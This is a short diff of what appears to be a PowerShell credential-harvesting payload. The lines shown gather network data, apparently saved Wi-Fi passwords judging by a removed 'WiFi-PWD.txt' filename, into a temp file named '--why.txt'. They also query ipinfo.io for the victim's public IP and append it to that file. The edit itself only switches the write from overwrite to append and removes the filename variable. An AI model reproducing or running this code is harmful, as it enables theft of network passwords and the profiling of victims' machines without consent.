@@ -50,9 +50,7 @@ $hdc = [PInvoke]::GetDC([IntPtr]::Zero)
 $w = [PInvoke]::GetDeviceCaps($hdc, 118) # width
 $h = [PInvoke]::GetDeviceCaps($hdc, 117) # height
 
-$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_WiFi-PWD.txt"
-
-($Networks| Out-String) > $env:TEMP/--why.txt
+($Networks| Out-String) >> $env:TEMP/--why.txt
 ############################################################################################################################################################
 $ip=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content;Add-Content -Path $env:TEMP/--why.txt "$ip";
 
